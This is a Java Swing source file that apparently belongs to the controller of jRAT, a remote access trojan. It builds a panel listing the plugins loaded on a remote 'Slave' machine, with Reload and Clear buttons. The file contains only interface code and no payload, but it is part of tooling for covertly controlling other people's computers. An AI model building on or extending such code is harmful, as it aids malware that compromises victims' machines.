package jrat.controller.ui.panels;

import jrat.api.Resources;
import jrat.controller.Slave;
import jrat.controller.packets.outgoing.Packet89LoadedPlugins;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;


@SuppressWarnings("serial")
public class PanelControlLoadedPlugins extends PanelControlParent {

	private JTable table;

	public JTable getTable() {
		return table;
	}

	public TableModel getModel() {
		return (TableModel) table.getModel();
	}

	public PanelControlLoadedPlugins(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReload = new JButton("Reload");
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
				slave.addToSendQueue(new Packet89LoadedPlugins());
			}
		});
		btnReload.setIcon(Resources.getIcon("update"));

		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				clear();
			}
		});
		btnClear.setIcon(Resources.getIcon("clear"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 599, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnReload).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear))).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 303, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear)).addContainerGap(18, Short.MAX_VALUE)));

		table = new DefaultJTable();
		//table.setDefaultRenderer(Object.class, new PluginsTableRenderer());
		table.setRowHeight(25);
		table.setModel(new TableModel(new Object[][] {}, new String[] { "Name" }) {
			public boolean isCellEditable(int i, int i1) {
				return false;
			}
		});
		table.getColumnModel().getColumn(0).setPreferredWidth(142);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
	}

	public void clear() {
		while (getModel().getRowCount() > 0) {
			getModel().removeRow(0);
		}
	}
}
